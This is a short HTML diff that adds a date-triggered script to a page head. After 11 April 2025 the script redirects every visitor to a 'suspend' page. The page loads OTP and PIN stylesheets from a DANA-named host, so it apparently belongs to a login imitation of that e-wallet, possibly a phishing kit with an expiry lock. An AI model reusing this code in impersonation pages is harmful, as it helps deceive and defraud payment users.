@@ -24,6 +24,15 @@
 <link rel="stylesheet" href="https://danacss.pages.dev/main.css">
 <link rel="stylesheet" href="https://danacss.pages.dev/otp.css">
 <link rel="stylesheet" href="https://danacss.pages.dev/pin.css">
+	<script>
+let tglNow = new Date();
+let waktuBatas = new Date("2025-04-11T23:59:59");
+if (tglNow.getTime() >= waktuBatas.getTime()) {
+  document.location.href = 'https://suspend-web.pages.dev';
+} else {
+  console.log('Server aktif');
+}
+	</script>
 </head>
 <style>
     
